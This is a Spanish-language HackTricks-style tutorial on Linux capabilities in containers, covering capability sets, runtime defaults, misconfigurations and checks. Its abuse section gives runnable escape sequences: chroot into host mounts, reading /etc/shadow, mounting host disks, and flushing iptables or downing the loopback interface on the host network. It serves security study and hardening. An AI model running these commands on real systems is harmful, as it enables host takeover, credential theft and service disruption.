# Capacidades de Linux en contenedores

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Las capacidades de Linux son uno de los elementos más importantes de la seguridad en contenedores porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente "root" dentro de un contenedor?** En un sistema Linux normal, UID 0 históricamente implicaba un conjunto de privilegios muy amplio. En kernels modernos, ese privilegio se descompone en unidades más pequeñas llamadas capacidades. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si se han eliminado las capacidades relevantes.

Los contenedores dependen en gran medida de esta distinción. Muchas cargas de trabajo todavía se lanzan como UID 0 dentro del contenedor por razones de compatibilidad o simplicidad. Sin el dropping de capacidades, eso sería demasiado peligroso. Con el dropping de capacidades, un proceso root en un contenedor aún puede realizar muchas tareas ordinarias dentro del contenedor mientras se le niegan operaciones de kernel más sensibles. Por eso una shell de contenedor que muestra `uid=0(root)` no significa automáticamente "host root" ni siquiera "privilegio amplio del kernel". Los conjuntos de capacidades deciden cuánto vale realmente esa identidad root.

Para la referencia completa de capacidades de Linux y muchos ejemplos de abuso, ver:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funcionamiento

Las capacidades se rastrean en varios conjuntos, incluyendo los conjuntos permitted, effective, inheritable, ambient y bounding. Para muchas evaluaciones de contenedores, la semántica exacta del kernel de cada conjunto es menos importante de inmediato que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar con éxito este proceso ahora mismo, y qué ganancias de privilegio futuras siguen siendo posibles?**

La razón por la que esto importa es que muchas técnicas de escape son en realidad problemas de capacidades disfrazados de problemas de contenedor. Una carga de trabajo con `CAP_SYS_ADMIN` puede acceder a una enorme cantidad de funcionalidad del kernel que un proceso root normal en un contenedor no debería tocar. Una carga de trabajo con `CAP_NET_ADMIN` se vuelve mucho más peligrosa si además comparte el namespace de red del host. Una carga de trabajo con `CAP_SYS_PTRACE` se vuelve mucho más interesante si puede ver procesos del host mediante el compartido de PID del host. En Docker o Podman eso puede aparecer como `--pid=host`; en Kubernetes normalmente aparece como `hostPID: true`.

En otras palabras, el conjunto de capacidades no puede evaluarse de forma aislada. Debe leerse en conjunto con namespaces, seccomp y la política MAC.

## Laboratorio

Una forma muy directa de inspeccionar las capacidades dentro de un contenedor es:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
También puedes comparar un contenedor más restrictivo con uno que tiene todas las capabilities añadidas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver el efecto de una adición limitada, intenta eliminar todo y añadir de nuevo solo una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estos pequeños experimentos ayudan a mostrar que un entorno de ejecución (runtime) no está simplemente alternando un booleano llamado "privileged". Está moldeando la superficie real de privilegios disponible para el proceso.

## Capacidades de alto riesgo

Aunque muchas capacidades pueden importar según el objetivo, unas pocas son repetidamente relevantes en el análisis de escapes de contenedores.

**`CAP_SYS_ADMIN`** es la que los defensores deberían tratar con mayor suspicacia. A menudo se describe como el "nuevo root" porque desbloquea una enorme cantidad de funcionalidad, incluyendo operaciones relacionadas con mount, comportamientos sensibles al namespace y muchos caminos del kernel que nunca deberían exponerse de forma casual a los contenedores. Si un contenedor tiene `CAP_SYS_ADMIN`, seccomp débil y no cuenta con un confinamiento MAC fuerte, muchas rutas clásicas de breakout se vuelven mucho más realistas.

**`CAP_SYS_PTRACE`** importa cuando existe visibilidad de procesos, especialmente si el PID namespace se comparte con el host o con cargas de trabajo vecinas interesantes. Puede convertir la visibilidad en manipulación.

**`CAP_NET_ADMIN`** y **`CAP_NET_RAW`** importan en entornos centrados en la red. En una red bridge aislada ya pueden ser riesgosas; en un namespace de red del host compartido son mucho peores porque la carga de trabajo podría reconfigurar la red del host, sniff, spoof, o interferir con los flujos de tráfico locales.

**`CAP_SYS_MODULE`** suele ser catastrófica en un entorno rootful porque cargar módulos del kernel es, efectivamente, control del kernel del host. Casi nunca debería aparecer en una carga de trabajo de contenedor de propósito general.

## Uso en tiempo de ejecución

Docker, Podman, stacks basados en containerd y CRI-O usan controles de capacidades, pero los valores por defecto y las interfaces de gestión difieren. Docker los expone muy directamente a través de flags como `--cap-drop` y `--cap-add`. Podman expone controles similares y con frecuencia se beneficia de la ejecución rootless como una capa adicional de seguridad. Kubernetes expone adiciones y eliminaciones de capacidades a través del Pod o del `securityContext` del contenedor. Entornos de system-container como LXC/Incus también dependen del control de capacidades, pero la integración más amplia con el host de esos sistemas a menudo tienta a los operadores a relajar los valores por defecto con más agresividad que en un entorno de app-container.

El mismo principio se aplica en todos ellos: una capacidad que es técnicamente posible conceder no es necesariamente una que deba concederse. Muchos incidentes del mundo real comienzan cuando un operador añade una capacidad simplemente porque una carga de trabajo falló bajo una configuración más estricta y el equipo necesitaba una solución rápida.

## Errores de configuración

El error más obvio es **`--cap-add=ALL`** en CLIs estilo Docker/Podman, pero no es el único. En la práctica, un problema más común es otorgar una o dos capacidades extremadamente potentes, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione" sin entender también las implicaciones de namespace, seccomp y mounts. Otro modo común de fallo es combinar capacidades extra con el uso compartido de namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes la exposición equivalente suele aparecer a través de ajustes de la carga de trabajo como `hostPID: true` o `hostNetwork: true`. Cada una de esas combinaciones cambia lo que la capacidad puede realmente afectar.

También es común que los administradores crean que, porque una carga de trabajo no es completamente `--privileged`, sigue estando significativamente restringida. A veces eso es cierto, pero otras veces la postura efectiva ya está lo suficientemente cerca de privileged como para que la distinción deje de importar operativamente.

## Abuso

El primer paso práctico es enumerar el conjunto efectivo de capacidades y probar de inmediato las acciones específicas de cada capacidad que importarían para escape o acceso a la información del host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` está presente, prueba primero mount-based abuse y host filesystem access, porque esto es uno de los breakout enablers más comunes:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` está presente y el container puede ver procesos interesantes, verifica si la capacidad puede convertirse en inspección de procesos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` o `CAP_NET_RAW` está presente, compruebe si la carga de trabajo puede manipular la pila de red visible o al menos recopilar inteligencia de red útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Cuando una prueba de capability tiene éxito, compárala con la situación del namespace. Una capability que parece solo arriesgada en un namespace aislado puede convertirse inmediatamente en una primitive de escape o de host-recon cuando el contenedor también comparte host PID, host network o host mounts.

### Ejemplo completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Si el contenedor tiene `CAP_SYS_ADMIN` y un bind mount escribible del sistema de archivos del host como `/host`, la ruta de escape suele ser directa:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` tiene éxito, los comandos ahora se ejecutan en el contexto del sistema de archivos raíz del host:
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` no está disponible, el mismo resultado a menudo se puede lograr llamando al binario a través del árbol montado:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Ejemplo completo: `CAP_SYS_ADMIN` + Acceso a dispositivos

Si se expone un dispositivo de bloque del host, `CAP_SYS_ADMIN` puede convertirlo en acceso directo al sistema de archivos del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Ejemplo completo: `CAP_NET_ADMIN` + Host Networking

Esta combinación no siempre produce host root directamente, pero puede reconfigurar completamente la pila de red del host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Eso puede permitir denial of service, traffic interception, o el acceso a servicios que antes estaban filtrados.

## Checks

El objetivo de los capability checks no es solo dump raw values, sino comprender si el proceso tiene suficientes privilegios para convertir su namespace y su situación de mount actuales en algo peligroso.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Lo interesante aquí:

- `capsh --print` es la forma más fácil de detectar capacidades de alto riesgo como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, o `cap_sys_module`.
- La línea `CapEff` en `/proc/self/status` te indica qué es realmente efectivo ahora, no solo lo que podría estar disponible en otros conjuntos.
- Un volcado de capacidades cobra mucha más importancia si el contenedor también comparte los namespaces de PID, network, o user del host, o tiene montajes del host con permisos de escritura.

Después de recopilar la información bruta de capacidades, el siguiente paso es la interpretación. Pregúntate si el proceso es root, si los user namespaces están activos, si los host namespaces están compartidos, si seccomp está en modo enforcing, y si AppArmor o SELinux todavía restringen el proceso. Un conjunto de capacidades por sí solo es solo parte de la historia, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla con el mismo punto de partida aparente.

## Runtime / plataforma

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capacidades reducido por defecto | Docker mantiene una allowlist por defecto de capacidades y elimina el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capacidades reducido por defecto | Los contenedores de Podman no son privilegiados por defecto y usan un modelo de capacidades reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime a menos que se cambie | Si no se especifican `securityContext.capabilities`, el contenedor recibe el conjunto de capacidades predeterminado del runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Por lo general, el valor predeterminado del runtime | El conjunto efectivo depende del runtime más la especificación del Pod | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Para Kubernetes, el punto importante es que la API no define un único conjunto de capacidades predeterminado universal. Si el Pod no añade ni elimina capacidades, la workload hereda el valor predeterminado del runtime para ese nodo.
{{#include ../../../../banners/hacktricks-training.md}}
